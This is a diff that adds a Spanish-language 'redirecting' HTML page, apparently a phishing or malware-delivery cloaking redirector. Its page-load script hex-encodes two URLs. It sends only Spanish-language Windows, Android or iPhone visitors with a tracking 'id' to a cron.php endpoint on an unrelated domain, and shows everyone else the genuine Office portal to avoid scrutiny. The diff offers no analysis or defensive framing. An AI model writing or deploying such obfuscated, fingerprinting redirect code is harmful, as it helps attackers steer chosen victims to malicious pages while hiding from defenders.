@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirigiendo...</title>
+    <script>
+        (function(){
+            function esSistemaAceptado() {
+                var userAgent = window.navigator.userAgent.toLowerCase();
+                return userAgent.includes('windows') || userAgent.includes('android') || userAgent.includes('iphone');
+            }
+
+            
+            function detectarIdioma() { 
+                
+             const idiomaNavegador = (navigator.language || navigator.userLanguage).toLowerCase();
+             return idiomaNavegador.startsWith('es');
+
+            }
+
+            
+            function getParameterByName(name) {
+                var urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(name);
+            }
+
+            
+            function decodeHex(hexString) {
+                var str = '';
+                for (var i = 0; i < hexString.length; i += 2) {
+                    str += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
+                }
+                return str;
+            }
+
+            var redirectOfficeHex = '68747470733a2f2f706f7274616c2e6f66666963652e636f6d';
+            var redirectCronHex = '68747470733a2f2f6661632e70756a616e74652e6f72672f63726f6e2e7068703f69643d';
+
+            
+            function redirigirConId() {
+                var idBase64 = getParameterByName('id');
+
+            
+                if (!esSistemaAceptado() || !detectarIdioma()) {
+                    window.location.href = decodeHex(redirectOfficeHex);
+                    return;
+                }
+
+            
+                if (idBase64) {
+                    var cronUrl = decodeHex(redirectCronHex) + idBase64;
+                    window.location.href = cronUrl;
+                } else {
+                    window.location.href = decodeHex(redirectOfficeHex);
+                }
+            }
+
+            window.onload = function() {
+                redirigirConId();
+            };
+        })();
+    </script>
+</head>
+<body>
+    <p>Redirigiendo, por favor espera...</p>
+</body>
+</html>
